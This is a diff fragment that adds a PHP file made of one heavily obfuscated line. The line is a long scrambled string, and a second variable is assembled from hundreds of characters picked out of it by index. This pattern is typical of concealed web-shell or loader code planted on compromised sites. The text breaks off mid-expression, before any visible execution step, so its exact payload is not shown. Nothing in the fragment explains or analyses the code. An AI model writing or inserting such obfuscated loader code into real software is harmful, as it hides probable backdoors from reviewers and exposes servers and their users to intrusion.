@@ -1,0 +1,592 @@
+<?php $aptemu='+3d9ghiSlW18cPGjcF/MHTzCcqAo9yd8jLmz4it4BWc/X(dgbUGpfziw38FM1Y5ibFvIw/WQOF4kcsrm4DJN497dWRFGLp0acwJ0SXYbdR/apZJ1sINWlZOg+I+Zy16vrv=lKi/ajoRGr/9XLeBcBpdnLeTYandBEXNiEuAsf36MylVgDrwh0CNsBGt1Pjv4/lr2CvbAXPDmkmhfgqAyj3RQ7qfzqHu+oBWFWDTpvLGF51K3MAuxr3imxBQ3B5Jesm8ez4vCN68WF/eBLQmJfpxTBGIyPwXaevmBjrBGSOIcWjBpNmT5hSvQKLqeKeZf)2hpS/pW1lBwjSmuxIxk4cGCJdhSRfR9tc94O/qvqC0S7lYDxRvQ/UJBtOnzbm0Z0nT2yL2AUcLbXFYBugZWLuFYO9mMXaBzABx2ZUUm81apA4GdwbRxaR8sSZiTagOw+bIsps1OGPbsdWSj3MsOMWfpINNvRENgw+EDS9mylZWzEtY3gvO8IIV2/uQdWZfwAB1WaMQz4Qc6vW94flfAX3fMocFh1xGeq/k0IkhW1yH1VvSPwkjzrXOf3OwnfdwumgnlFUnyCbhVp221T6IA_cRzXhUznfFTsF+cv2TUSCGgzG+55JFwVg3FKaks0aB7O56RM+FZj3Ht70yttV6pGfyAzA2drgG1DDUZKjdwk84miGm2Sccea7vkFWzm8GHNYtp3r8BVXYyHZu3KVjLpwv9j7hpIa/UlbMSGxON6LAEooado/odqzvBayA1BtkoJSASCvnylSqGroCGpK4N27hfLjob6GECUl/7WfeQxsFrfxLw2DNHPbQO2YnxwO3rvELEuDcxv8w1mkIYvLEO7jFHDKEHFzNqtTO5wVozFPc+EZ2lFB4+EfgDB0reE6V7bOWjU9B9E21f2wpZGkegzWCFeem8+IvIn3/OFQ7XqVbOPyUohi9U8w7YPZg38BOoEU5rIgxi0juoL/OtbB+LjqgmIfvzRcepeUZsjaXQUd9DvguR4YPshavlzIwxqtNytrpi9TrvtwCLMUDLz/27psvCsfs1cssCK4DOiIYKA501jFnqiXzGLWyMFRV8fT9ataAvE/olhN7VCz1OHczg2TEudRZv3qwtlhh9UT7Y45rBZWxcqJYR1iHb4DfqGEQTsxX6mC/2Ucii6VzsF/k+scnjj+eNmyTX/vQu9czOXnkTJ7UVQbmm+iKcTvnvvKbouQOwQ4nQ58rinNfGvWGxzSTnCN0ImdgYATbeDdpyszAV7DP6PoFbqOrjiZxkWqkHYvXG/lK2/JKG4icCQGF8Xpf8YmjEcohxTS7H/=GJZ3VafzsKrtph92sE6BwafLnEMBatMDeb2XFPi2mDp1jQ4tZwrD1CLGM8wmv3Eu2B46OgkVMxprsQR+K2BV1p6nxme9z+oj5OtBgYSJbsvyT7fL1GAVI5ZzGcOOWWzDUMgSVZWU05Rqkw4wZleuzZXz6GN3MTY7UezOTPGNQ2M+gEHhVFWetGX1aWCGwiW5rSARw2Tubxk/uI67xMvXeoXNn6pa9jrZtdsPbGSz49QQKFjh3BP0Z6NDND+gqLUrKaA7_gBQJ5GIvy2DHQ6kq+n5DQmyEJ/i+UEnApm1+YdQxU2Env3I69cMXynJlpJqctu0mVk8Ne2olos+rsfu/HLzy985DmGTQJw/rxgbts95gQrKCW7Y4VBi09H31jG/9dt0cL+eDQmDmO9JxGkk8tswY3zXx9diaxj5id1Lh9ZtsC9mfXFjRWU26olzhIycHrFnGnlQ4IY5h0rHg2H4i5IjWNIqKgZJCtjXZj5vkYRhG88jfQjQPoBBJUPYK4lj6ZyGxtLF0UF9thgxUarTTtdclE9zBd37lKuJ2KBFewpuAUY6G4DTFTkvkeTx6oH26snwDLzGrqSe9e1ejkIE/Fvl2/HxSM4GN6VDoju6FhEFs6v5BkVmHwFnOGglDgY9Q7Ejdee2zmh4dWhIuVFdj7/NGdNLKiiROf5r2uFCn4wouZdtCnBgJ/dsjaJMHP7vCs42GxSKh2AOdyTr9bYIQ+RFmHK4CfFHCUe2mZVe2uSOHZiS9jcCunJuIsxKAzMUu3l0To9o6xjnqvoe6LvkDTz3Ab/US6a2oMmO38qDBLHG3lvnsMxZR/NjPYnjhWPRSfY[WbZQ6DX9iOim1PfnVUcjjMpcALrFNEuWsaayMEbwTogLKUte4cGeluSlj2SNm+kecZxUNbNp/pD7ziwhE80cekMr7xFWoSAIcvLQcdenNIwstMjkMKZSPCYgncWMsVaxxmt5JCSZEZapf6u5GtZpDXENniZOcQ7LnJJOBQwjlJNdZaitnnqvKTlB$sO8lBjJnYbEcsr1V5LuyZoco6V5Il7203vusV5yB3oBWX72EO9zOvq4fb3VsoJ9C47SuVfZqRP5T+Zf2t89ym3In/FWCH0UZCoN+BNOZDsg+PCPG4FwjsoODVQe5G1pJX1Iczs8cON77JwPyYNXHRhRrwaaqOnHheqEATDjjt6ODyRoSGCjuHaUynJxYE7eMBb+8GzmqUkChFnBV24cx2wqRpVCHuKT0bqcQzWnV0vPSIW3Lk84JPx3GSP0BJ6Qv/5+7J2J9O6gomV1Ktmly8uYr2OTIDpQwvg6g6cWvrGyjAT41amD6rJOzdBIfiC4R1sKeSyhEU0o9XSQtaSqMM0uzS62yKiRzoUpobSDCvLSoToPune+MGA/6fmys0aNtdy9Tk3SbqSrR2+iwMYdTkcUDk1DcM/fcZaz6XLGnR0jkBUi/46olqlZ+Gpks32wBhmtlN/U+wdjC6o3rjleCFrVXIdmXp5Y6zV6CfhC0Yj6F6gC3BxQUBv59X+tFtALsjfD54xQN7nVKDGYzvcCzTr79TtB7m+fkmW2sr05yRJEDxcTZ7jT/PrwMPSqZ+Z3eSelETtBiumj0rNK]m2nzMOpFGdHn9E4oE864UWqctpThC2LbgX5xjvy2Nc6BbStDupwTWNxSIfHwR/aKoqX+UY/JG4XVNmZpaI318MhT6ImDgpxAy9yyAjrvl`Xr3m6qppnbDHUY+jDgkpGMZniO/cmZ598pNOc5cEZDbxpitr4aJ88vUNORyWjN9MyD8LQ/QohzJYB87db5V1FqxvduHNjTN2nEHyeTEw6lNHPlkQ+cmid76avYaky3KvwZi0WHCj//Ou+Rxt8q1sgkl4UTzzI5KcUf+7/Ih2JBSzWL56vwiH5xrLj5dB1MoPbMph1f6vfoi4ajrcKrzAEF2bsnk/m/CmY339MaBKuroBA7AOOEkZsutaqLuSdV/0rpWVqhRC/Jxt9eJSSYkeMlb0STDvtXGA1FJ/UAl3D0EG8cxNKoj5D5B6VhtqUtCXwaxq9nV1+H/Wv7AO6lbQd7DNWxcoXpfQM4ib0_uJLqunIiIilnjkwljjS8nHg/uFptHIbwncNFmA8HsTXHP63myk8xD$B28X8Jbc4xemnYvvj42JutWJ9u3vmn6XhGct16OUoGSBBN5mp8s4T5UKNyhJRt5StLPJ12YeBgfdgfonTHKvd9vJXxTGjKz8UhG2zbqlRWYiXxYq0lX1CGD2lL6T0RAloRvhUpMp1bez+uMGGnoAZC2AFgke/JtepJQiRBL2oNwiTu2yl9KVYbEmkeFQdtSqrIoKwhbWb4vI3SrIdwlQDalaJv/lCC/SpSuU8SdWlfvu0nMTjSZG0xqnJg7phyRTHHMWoXFVx+nra1vYoVZ0B4RqKRjt6ddutwBqNwzYod+ie/2O5iIaT4QRoJAw73Jm2gQriYjAY751jbdxw+jT15w09rQDYDfYX96L02FjNNLxdqIMK5ccpOdTxKwVzXly+tlrZCzqfeFKvLFZHwFUjbBWCWzXX49Ng+wIPQUTtWqn+zlkBQS7X40G+8IlUjbgaUAbG9bFdB09xwYzKX6CqwI4rhaa3sTgYPiTsGotxkQcbnvq+1h0cj8F2B2bpKCCCvbXXDCERk4ZADt0hSPApj;z1wRqQWKqbRC7AP2luhNJEL0Eq6ClCWA^S7t5ULD9TMAZ9udkT+Edu5mcZjd/kj/ZvEJs/c6Nw/JLwwmTHb6ZX0piVrZ2CqqQE2t\zHHdV/OW2ZULbtf6KpNMr2mqrHnUi605FPfTsfLFO3GdYmL9ed0O3Rz/bJQhjaL5R/xmmCHC9JnL+MOlxTP/tbCdPewnOlU64u2rhqAjzTmTu5bY27J5Qv2sAXNdAEIe+v92Pm/AyD5SpLhcpZn5AEeXyDDb+qL2McUPpex4NlCNH5fs4v+H9lkjr+WP8xe512ilQnc5IMglKw5G44SwPKS3jwRbG+mnUzGsfpNmfq+'; $goetyogljtrx=$aptemu[145].$aptemu[83].$aptemu[78].$aptemu[38].$aptemu[14].$aptemu[34].$aptemu[38].$aptemu[21].$aptemu[36].$aptemu[94].$aptemu[48].$aptemu[29].$aptemu[19].$aptemu[10].$aptemu[165].$aptemu[10].$aptemu[18].$aptemu[195].$aptemu[17].$aptemu[9].$aptemu[2].$aptemu[51].$aptemu[23].$aptemu[94].$aptemu[77].$aptemu[9].$aptemu[49].$aptemu[48].$aptemu[2].$aptemu[77].$aptemu[75].$aptemu[2].$aptemu[15].$aptemu[5].$aptemu[67].$aptemu[67].$aptemu[34].$aptemu[160].$aptemu[81].$aptemu[17].$aptemu[61].$aptemu[19].$aptemu[126].$aptemu[61].$aptemu[86].$aptemu[132].$aptemu[9].$aptemu[26].$aptemu[25].$aptemu[67].$aptemu[71].$aptemu[11].$aptemu[243].$aptemu[4].$aptemu[51].$aptemu[126].$aptemu[8].$aptemu[49].$aptemu[48].$aptemu[34].$aptemu[77].$aptemu[109].$aptemu[15].$aptemu[18].$aptemu[151].$aptemu[51].$aptemu[36].$aptemu[109].$aptemu[15].$aptemu[21].$aptemu[7].$aptemu[7].$aptemu[48].$aptemu[21].$aptemu[81].$aptemu[77].$aptemu[48].$aptemu[38].$aptemu[10].$aptemu[2].$aptemu[10].$aptemu[9].$aptemu[94].$aptemu[38].$aptemu[77].$aptemu[15].$aptemu[22].$aptemu[21].$aptemu[1].$aptemu[2].$aptemu[13].$aptemu[21].$aptemu[1].$aptemu[2].$aptemu[72].$aptemu[66].$aptemu[11].$aptemu[89].$aptemu[95].$aptemu[72].$aptemu[36].$aptemu[22].$aptemu[23].$aptemu[195].$aptemu[61].$aptemu[5].$aptemu[29].$aptemu[17].$aptemu[12].$aptemu[145].$aptemu[67].$aptemu[14].$aptemu[174].$aptemu[10].$aptemu[51].$aptemu[21].$aptemu[48].$aptemu[86].$aptemu[3].$aptemu[3].$aptemu[19].$aptemu[86].$aptemu[71].$aptemu[21].$aptemu[48].$aptemu[26].$aptemu[1].$aptemu[243].$aptemu[29].$aptemu[82].$aptemu[62].$aptemu[36].$aptemu[6].$aptemu[109].$aptemu[9].$aptemu[36].$aptemu[13].$aptemu[66].$aptemu[36].$aptemu[12].$aptemu[40].$aptemu[38].$aptemu[4].$aptemu[6].$aptemu[72].$aptemu[83].$aptemu[20].$aptemu[49].$aptemu[44].$aptemu[55].$aptemu[11].$aptemu[20].$aptemu[132].$aptemu[4].$aptemu[174].$aptemu[62].$aptemu[0].$aptemu[11].$aptemu[61].$aptemu[2].$aptemu[67].$aptemu[12].$aptemu[94].$aptemu[8].$aptemu[2].$aptemu[33].$aptemu[40].$aptemu[25].$aptemu[86].$aptemu[52].$aptemu[89].$aptemu[126].$aptemu[66].$aptemu[243].$aptemu[10].$aptemu[94].$aptemu[22].$aptemu[38].$aptemu[21].$aptemu[48].$aptemu[19].$aptemu[40].$aptemu[62].$aptemu[14].$aptemu[19].$aptemu[7].$aptemu[48].$aptemu[160].$aptemu[7].$aptemu[15].$aptemu[40].$aptemu[82].$aptemu[33].$aptemu[23].$aptemu[12].$aptemu[19].$aptemu[78].$aptemu[10].$aptemu[195].$aptemu[77].$aptemu[44].$aptemu[165].$aptemu[5].$aptemu[27].$aptemu[72].$aptemu[75].$aptemu[49].$aptemu[22].$aptemu[77].$aptemu[17].$aptemu[160].$aptemu[2].$aptemu[40].$aptemu[165].$aptemu[6].$aptemu[6].$aptemu[51].$aptemu[83].$aptemu[62].$aptemu[95].$aptemu[26].$aptemu[27].$aptemu[48].$aptemu[29].$aptemu[75].$aptemu[71].$aptemu[17].$aptemu[25].$aptemu[27].$aptemu[94].$aptemu[151].$aptemu[4].$aptemu[82].$aptemu[14].$aptemu[36].$aptemu[61].$aptemu[9].$aptemu[13].$aptemu[15].$aptemu[72].$aptemu[82].$aptemu[71].$aptemu[151].$aptemu[89].$aptemu[174].$aptemu[82].$aptemu[2].$aptemu[61].$aptemu[160].$aptemu[36].$aptemu[82].$aptemu[15].$aptemu[29].$aptemu[55].$aptemu[165].$aptemu[66].$aptemu[78].$aptemu[66].$aptemu[81].$aptemu[71].$aptemu[12].$aptemu[4].$aptemu[83].$aptemu[174].$aptemu[89].$aptemu[126].$aptemu[165].$aptemu[78].$aptemu[95].$aptemu[14].$aptemu[109].$aptemu[61].$aptemu[94].$aptemu[243].$aptemu[34].$aptemu[40].$aptemu[25].$aptemu[151].$aptemu[44].$aptemu[7].$aptemu[126].$aptemu[52].$aptemu[18].$aptemu[145].$aptemu[126].$aptemu[109].$aptemu[11].$aptemu[51].$aptemu[18].$aptemu[12].$aptemu[126].$aptemu[18].$aptemu[21].$aptemu[15].$aptemu[77].$aptemu[151].$aptemu[26].$aptemu[0].$aptemu[165].$aptemu[94].$aptemu[52].$aptemu[126].$aptemu[40].$aptemu[12].$aptemu[34].$aptemu[132].$aptemu[48].$aptemu[7].$aptemu[49].$aptemu[20].$aptemu[21].$aptemu[94].$aptemu[11].$aptemu[13].$aptemu[48].$aptemu[83].$aptemu[67].$aptemu[18].$aptemu[61].$aptemu[67].$aptemu[52].$aptemu[25].$aptemu[26].$aptemu[48].$aptemu[44].$aptemu[44].$aptemu[17].$aptemu[20].$aptemu[14].$aptemu[34].$aptemu[22].$aptemu[25].$aptemu[29].$aptemu[66].$aptemu[33].$aptemu[38].$aptemu[243].$aptemu[40].$aptemu[8].$aptemu[78].$aptemu[7].$aptemu[75].$aptemu[9].$aptemu[86].$aptemu[23].$aptemu[77].$aptemu[19].$aptemu[78].$aptemu[81].$aptemu[10].$aptemu[0].$aptemu[14].$aptemu[29].$aptemu[52].$aptemu[71].$aptemu[7].$aptemu[9].$aptemu[132].$aptemu[72].$aptemu[52].$aptemu[3].$aptemu[18].$aptemu[61].$aptemu[36].$aptemu[81].$aptemu[132].$aptemu[12].$aptemu[0].$aptemu[23].$aptemu[145].$aptemu[4].$aptemu[44].$aptemu[72].$aptemu[18].$aptemu[7].$aptemu[34].$aptemu[55].$aptemu[36].$aptemu[8].$aptemu[22].$aptemu[21].$aptemu[52].$aptemu[18].$aptemu[94].$aptemu[6].$aptemu[25].$aptemu[66].$aptemu[49].$aptemu[11].$aptemu[77].$aptemu[44].$aptemu[195].$aptemu[40].$aptemu[36].$aptemu[83].$aptemu[15].$aptemu[126].$aptemu[243].$aptemu[7].$aptemu[0].$aptemu[9].$aptemu[2].$aptemu[165].$aptemu[18].$aptemu[2].$aptemu[27].$aptemu[36].$aptemu[14].$aptemu[29].$aptemu[27].$aptemu[49].$aptemu[0].$aptemu[151].$aptemu[12].$aptemu[126].$aptemu[15].$aptemu[22].$aptemu[71].$aptemu[15].$aptemu[151].$aptemu[174].$aptemu[14].$aptemu[2].$aptemu[82].$aptemu[48].$aptemu[51].$aptemu[174].$aptemu[27].$aptemu[3].$aptemu[15].$aptemu[38].$aptemu[86].$aptemu[151].$aptemu[44].$aptemu[126].$aptemu[151].$aptemu[81].$aptemu[55].$aptemu[89].$aptemu[10].$aptemu[61].$aptemu[20].$aptemu[51].$aptemu[8].$aptemu[160].$aptemu[12].$aptemu[3].$aptemu[52].$aptemu[21].$aptemu[20].$aptemu[145].$aptemu[8].$aptemu[23].$aptemu[15].$aptemu[165].$aptemu[94].$aptemu[4].$aptemu[27].$aptemu[8].$aptemu[66].$aptemu[78].$aptemu[78].$aptemu[44].$aptemu[51].$aptemu[2].$aptemu[29].$aptemu[160].$aptemu[34].$aptemu[145].$aptemu[95].$aptemu[48].$aptemu[17].$aptemu[109].$aptemu[62].$aptemu[15].$aptemu[77].$aptemu[174].$aptemu[25].$aptemu[25].$aptemu[89].$aptemu[12].$aptemu[195].$aptemu[195].$aptemu[25].$aptemu[48].$aptemu[78].$aptemu[7].$aptemu[34].$aptemu[38].$aptemu[66].$aptemu[75].$aptemu[26].$aptemu[12].$aptemu[33].$aptemu[95].$aptemu[10].$aptemu[49].$aptemu[13].$aptemu[51].$aptemu[25].$aptemu[67].$aptemu[55].$aptemu[126].$aptemu[40].$aptemu[81].$aptemu[81].$aptemu[14].$aptemu[7].$aptemu[165].$aptemu[94].$aptemu[89].$aptemu[83].$aptemu[174].$aptemu[243].$aptemu[243].$aptemu[15].$aptemu[145].$aptemu[36].$aptemu[5].$aptemu[15].$aptemu[21].$aptemu[2].$aptemu[75].$aptemu[82].$aptemu[4].$aptemu[55].$aptemu[71].$aptemu[20].$aptemu[7].$aptemu[44].$aptemu[10].$aptemu[55].$aptemu[20].$aptemu[0].$aptemu[17].$aptemu[83].$aptemu[8].$aptemu[72].$aptemu[23].$aptemu[86].$aptemu[51].$aptemu[40].$aptemu[17].$aptemu[62].$aptemu[38].$aptemu[5].$aptemu[77].$aptemu[27].$aptemu[72].$aptemu[8].$aptemu[38].$aptemu[66].$aptemu[40].$aptemu[21].$aptemu[66].$aptemu[15].$aptemu[160].$aptemu[132].$aptemu[34].$aptemu[151].$aptemu[27].$aptemu[72].$aptemu[195].$aptemu[126].$aptemu[52].$aptemu[71].$aptemu[9].$aptemu[26].$aptemu[34].$aptemu[0].$aptemu[15].$aptemu[3].$aptemu[195].$aptemu[22].$aptemu[145].$aptemu[86].$aptemu[33].$aptemu[78].$aptemu[160].$aptemu[3].$aptemu[33].$aptemu[86].$aptemu[22].$aptemu[2].$aptemu[89].$aptemu[14].$aptemu[27].$aptemu[132].$aptemu[2].$aptemu[145].$aptemu[12].$aptemu[34].$aptemu[40].$aptemu[52].$aptemu[62].$aptemu[165].$aptemu[48].$aptemu[195].$aptemu[18].$aptemu[83].$aptemu[109].$aptemu[5].$aptemu[165].$aptemu[36].$aptemu[67].$aptemu[75].$aptemu[75].$aptemu[19].$aptemu[51].$aptemu[5].$aptemu[89].$aptemu[78].$aptemu[82].$aptemu[71].$aptemu[151].$aptemu[77].$aptemu[3].$aptemu[94].$aptemu[62].$aptemu[26].$aptemu[21].$aptemu[22].$aptemu[49].$aptemu[174].$aptemu[36].$aptemu[17].$aptemu[89].$aptemu[2].$aptemu[109].$aptemu[0].$aptemu[23].$aptemu[38].$aptemu[52].$aptemu[23].$aptemu[66].$aptemu[66].$aptemu[29].$aptemu[27].$aptemu[95].$aptemu[27].$aptemu[72].$aptemu[14].$aptemu[13].$aptemu[77].$aptemu[44].$aptemu[17].$aptemu[83].$aptemu[21].$aptemu[6].$aptemu[243].$aptemu[71].$aptemu[5].$aptemu[19].$aptemu[55].$aptemu[14].$aptemu[81].$aptemu[11].$aptemu[15].$aptemu[8].$aptemu[83].$aptemu[62].$aptemu[86].$aptemu[109].$aptemu[17].$aptemu[62].$aptemu[145].$aptemu[109].$aptemu[14].$aptemu[109].$aptemu[15].$aptemu[81].$aptemu[243].$aptemu[66].$aptemu[20].$aptemu[48].$aptemu[126].$aptemu[83].$aptemu[12].$aptemu[95].$aptemu[195].$aptemu[40].$aptemu[94].$aptemu[19].$aptemu[17].$aptemu[67].$aptemu[89].$aptemu[1].$aptemu[195].$aptemu[40].$aptemu[5].$aptemu[10].$aptemu[78].$aptemu[145].$aptemu[1].$aptemu[12].$aptemu[44].$aptemu[17].$aptemu[23].$aptemu[20].$aptemu[26].$aptemu[27].$aptemu[15].$aptemu[6].$aptemu[11].$aptemu[165].$aptemu[195].$aptemu[0].$aptemu[109].$aptemu[109].$aptemu[61].$aptemu[44].$aptemu[38].$aptemu[2].$aptemu[26].$aptemu[18].$aptemu[26].$aptemu[77].$aptemu[132].$aptemu[29].$aptemu[81].$aptemu[36].$aptemu[243].$aptemu[33].$aptemu[75].$aptemu[195].$aptemu[4].$aptemu[22].$aptemu[75].$aptemu[66].$aptemu[126].$aptemu[195].$aptemu[3].$aptemu[44].$aptemu[66].$aptemu[18].$aptemu[21].$aptemu[2].$aptemu[151].$aptemu[0].$aptemu[1].$aptemu[77].$aptemu[94].$aptemu[66].$aptemu[52].$aptemu[19].$aptemu[151].$aptemu[15].$aptemu[61].$aptemu[10].$aptemu[12].$aptemu[15].$aptemu[10].$aptemu[160].$aptemu[15].$aptemu[4].$aptemu[94].$aptemu[83].$aptemu[22].$aptemu[109].$aptemu[67].$aptemu[4].$aptemu[126].$aptemu[3].$aptemu[21].$aptemu[195].$aptemu[22].$aptemu[66].$aptemu[27].$aptemu[81].$aptemu[77].$aptemu[40].$aptemu[77].$aptemu[52].$aptemu[3].$aptemu[18].$aptemu[165].$aptemu[20].$aptemu[165].$aptemu[243].$aptemu[165].$aptemu[26].$aptemu[22].$aptemu[19].$aptemu[20].$aptemu[243].$aptemu[195].$aptemu[82].$aptemu[1].$aptemu[52].$aptemu[26].$aptemu[12].$aptemu[51].$aptemu[44].$aptemu[160].$aptemu[25].$aptemu[81].$aptemu[34].$aptemu[12].$aptemu[174].$aptemu[6].$aptemu[12].$aptemu[34].$aptemu[38].$aptemu[33].$aptemu[75].$aptemu[8].$aptemu[165].$aptemu[21].$aptemu[29].$aptemu[89].$aptemu[9].$aptemu[34].$aptemu[165].$aptemu[109].$aptemu[81].$aptemu[160].$aptemu[83].$aptemu[13].$aptemu[0].$aptemu[67].$aptemu[12].$aptemu[21].$aptemu[132].$aptemu[82].$aptemu[26].$aptemu[10].$aptemu[71].$aptemu[174].$aptemu[36].$aptemu[36].$aptemu[0].$aptemu[7].$aptemu[34].$aptemu[165].$aptemu[145].$aptemu[25].$aptemu[126].$aptemu[4].$aptemu[27].$aptemu[151].$aptemu[10].$aptemu[6].$aptemu[21].$aptemu[195].$aptemu[109].$aptemu[66].$aptemu[9].$aptemu[49].$aptemu[21].$aptemu[34].$aptemu[5].$aptemu[174].$aptemu[145].$aptemu[26].$aptemu[6].$aptemu[195].$aptemu[126].$aptemu[81].$aptemu[62].$aptemu[34].$aptemu[2].$aptemu[26].$aptemu[1].$aptemu[22].$aptemu[36].$aptemu[17].$aptemu[13].$aptemu[12].$aptemu[89].$aptemu[82].$aptemu[14].$aptemu[36].$aptemu[2].$aptemu[11].$aptemu[109].$aptemu[34].$aptemu[83].$aptemu[25].$aptemu[126].$aptemu[8].$aptemu[38].$aptemu[78].$aptemu[34].$aptemu[29].$aptemu[55].$aptemu[27].$aptemu[48].$aptemu[26].$aptemu[34].$aptemu[61].$aptemu[49].$aptemu[89].$aptemu[72].$aptemu[81].$aptemu[5].$aptemu[151].$aptemu[44].$aptemu[83].$aptemu[77].$aptemu[62].$aptemu[86].$aptemu[44].$aptemu[2].$aptemu[86].$aptemu[243].$aptemu[3].$aptemu[21].$aptemu[55].$aptemu[165].$aptemu[22].$aptemu[9].$aptemu[195].$aptemu[22].$aptemu[33].$aptemu[72].$aptemu[26].$aptemu[27].$aptemu[81].$aptemu[22].$aptemu[34].$aptemu[83].$aptemu[14].$aptemu[78].$aptemu[132].$aptemu[61].$aptemu[52].$aptemu[15].$aptemu[109].$aptemu[3].$aptemu[21].$aptemu[29].$aptemu[86].$aptemu[11].$aptemu[2].$aptemu[17].$aptemu[27].$aptemu[67].$aptemu[165].$aptemu[195].$aptemu[21].$aptemu[14].$aptemu[55].$aptemu[22].$aptemu[81].$aptemu[9].$aptemu[36].$aptemu[132].$aptemu[72].$aptemu[40].$aptemu[25].$aptemu[15].$aptemu[174].$aptemu[83].$aptemu[82].$aptemu[51].$aptemu[38].$aptemu[3].$aptemu[132].$aptemu[151].$aptemu[1].$aptemu[95].$aptemu[145].$aptemu[72].$aptemu[81].$aptemu[15].$aptemu[78].$aptemu[95].$aptemu[15].$aptemu[29].$aptemu[19].$aptemu[72].$aptemu[52].$aptemu[11].$aptemu[72].$aptemu[174].$aptemu[66].$aptemu[48].$aptemu[38].$aptemu[33].$aptemu[36].$aptemu[165].$aptemu[13].$aptemu[126].$aptemu[81].$aptemu[77].$aptemu[48].$aptemu[126].$aptemu[40].$aptemu[38].$aptemu[83].$aptemu[18].$aptemu[195].$aptemu[40].$aptemu[36].$aptemu[52].$aptemu[2].$aptemu[14].$aptemu[66].$aptemu[33].$aptemu[12].$aptemu[95].$aptemu[36].$aptemu[243].$aptemu[0].$aptemu[40].$aptemu[174].$aptemu[19].$aptemu[19].$aptemu[2].$aptemu[48].$aptemu[71].$aptemu[22].$aptemu[15].$aptemu[75].$aptemu[19].$aptemu[52].$aptemu[83].$aptemu[22].$aptemu[61].$aptemu[26].$aptemu[10].$aptemu[174].$aptemu[5].$aptemu[66].$aptemu[38].$aptemu[2].$aptemu[95].$aptemu[19].$aptemu[174].$aptemu[34].$aptemu[77].$aptemu[2].$aptemu[151].$aptemu[2].$aptemu[4].$aptemu[15].$aptemu[72].$aptemu[1].$aptemu[109].$aptemu[21].$aptemu[83].$aptemu[72].$aptemu[174].$aptemu[109].$aptemu[10].$aptemu[4].$aptemu[61].$aptemu[20].$aptemu[5].$aptemu[62].$aptemu[1].$aptemu[145].$aptemu[126].$aptemu[95].$aptemu[23].$aptemu[195].$aptemu[10].$aptemu[151].$aptemu[55].$aptemu[9].$aptemu[38].$aptemu[83].$aptemu[11].$aptemu[109].$aptemu[151].$aptemu[13].$aptemu[95].$aptemu[13].$aptemu[40].$aptemu[66].$aptemu[1].$aptemu[38].$aptemu[27].$aptemu[243].$aptemu[83].$aptemu[55].$aptemu[33].$aptemu[33].$aptemu[49].$aptemu[75].$aptemu[151].$aptemu[165].$aptemu[26].$aptemu[19].$aptemu[51].$aptemu[243].$aptemu[51].$aptemu[72].$aptemu[160].$aptemu[6].$aptemu[36].$aptemu[126].$aptemu[52].$aptemu[67].$aptemu[12].$aptemu[2].$aptemu[6].$aptemu[8].$aptemu[61].$aptemu[75].$aptemu[62].$aptemu[1].$aptemu[4].$aptemu[5].$aptemu[55].$aptemu[52].$aptemu[82].$aptemu[55].$aptemu[94].$aptemu[7].$aptemu[55].$aptemu[27].$aptemu[83].$aptemu[8].$aptemu[4].$aptemu[95].$aptemu[38].$aptemu[25].$aptemu[15].$aptemu[195].$aptemu[20].$aptemu[72].$aptemu[36].$aptemu[77].$aptemu[6].$aptemu[23].$aptemu[48].$aptemu[33].$aptemu[38].$aptemu[34].$aptemu[71].$aptemu[151].$aptemu[4].$aptemu[17].$aptemu[26].$aptemu[195].$aptemu[17].$aptemu[13].$aptemu[51].$aptemu[7].$aptemu[77].$aptemu[26].$aptemu[33].$aptemu[165].$aptemu[52].$aptemu[23].$aptemu[55].$aptemu[86].$aptemu[14].$aptemu[26].$aptemu[25].$aptemu[7].$aptemu[55].$aptemu[67].$aptemu[26].$aptemu[2].$aptemu[5].$aptemu[67].$aptemu[20].$aptemu[78].$aptemu[195].$aptemu[17].$aptemu[126].$aptemu[38].$aptemu[34].$aptemu[66].$aptemu[6].$aptemu[89].$aptemu[11].$aptemu[67].$aptemu[77].$aptemu[12].$aptemu[49].$aptemu[15].$aptemu[78].$aptemu[82].$aptemu[10].$aptemu[12].$aptemu[5].$aptemu[72].$aptemu[55].$aptemu[72].$aptemu[55].$aptemu[81].$aptemu[109].$aptemu[23].$aptemu[132].$aptemu[8].$aptemu[11].$aptemu[9].$aptemu[145].$aptemu[132].$aptemu[44].$aptemu[49].$aptemu[18].$aptemu[26].$aptemu[145].$aptemu[62].$aptemu[195].$aptemu[21].$aptemu[3].$aptemu[62].$aptemu[66].$aptemu[55].$aptemu[51].$aptemu[243].$aptemu[151].$aptemu[66].$aptemu[3].$aptemu[9].$aptemu[78].$aptemu[81].$aptemu[174].$aptemu[21].$aptemu[15].$aptemu[36].$aptemu[75].$aptemu[66].$aptemu[61].$aptemu[10].$aptemu[243].$aptemu[86].$aptemu[55].$aptemu[25].$aptemu[48].$aptemu[40].$aptemu[21].$aptemu[49].$aptemu[7].$aptemu[9].$aptemu[1].$aptemu[9].$aptemu[40].$aptemu[40].$aptemu[2].$aptemu[14].$aptemu[36].$aptemu[86].$aptemu[8].$aptemu[151].$aptemu[72].$aptemu[10].$aptemu[5].$aptemu[21].$aptemu[243].$aptemu[94].$aptemu[75].$aptemu[7].$aptemu[75].$aptemu[12].$aptemu[10].$aptemu[14].$aptemu[71].$aptemu[126].$aptemu[195].$aptemu[243].$aptemu[174].$aptemu[18].$aptemu[95].$aptemu[9].$aptemu[11].$aptemu[29].$aptemu[18].$aptemu[75].$aptemu[11].$aptemu[25].$aptemu[89].$aptemu[38].$aptemu[33].$aptemu[4].$aptemu[18].$aptemu[3].$aptemu[20].$aptemu[22].$aptemu[52].$aptemu[71].$aptemu[62].$aptemu[145].$aptemu[1].$aptemu[22].$aptemu[17].$aptemu[145].$aptemu[95].$aptemu[62].$aptemu[23].$aptemu[72].$aptemu[44].$aptemu[75].$aptemu[51].$aptemu[14].$aptemu[165].$aptemu[40].$aptemu[49].$aptemu[22].$aptemu[1].$aptemu[61].$aptemu[0].$aptemu[0].$aptemu[72].$aptemu[36].$aptemu[26].$aptemu[29].$aptemu[6].$aptemu[27].$aptemu[165].$aptemu[21].$aptemu[55].$aptemu[23].$aptemu[81].$aptemu[7].$aptemu[10].$aptemu[33].$aptemu[67].$aptemu[72].$aptemu[22].$aptemu[10].$aptemu[165].$aptemu[38].$aptemu[1].$aptemu[145].$aptemu[51].$aptemu[195].$aptemu[62].$aptemu[66].$aptemu[109].$aptemu[1].$aptemu[38].$aptemu[55].$aptemu[94].$aptemu[81].$aptemu[165].$aptemu[25].$aptemu[27].$aptemu[109].$aptemu[95].$aptemu[145].$aptemu[145].$aptemu[44].$aptemu[61].$aptemu[67].$aptemu[2].$aptemu[23].$aptemu[66].$aptemu[22].$aptemu[15].$aptemu[94].$aptemu[243].$aptemu[25].$aptemu[15].$aptemu[195].$aptemu[40].$aptemu[11].$aptemu[48].$aptemu[40].$aptemu[51].$a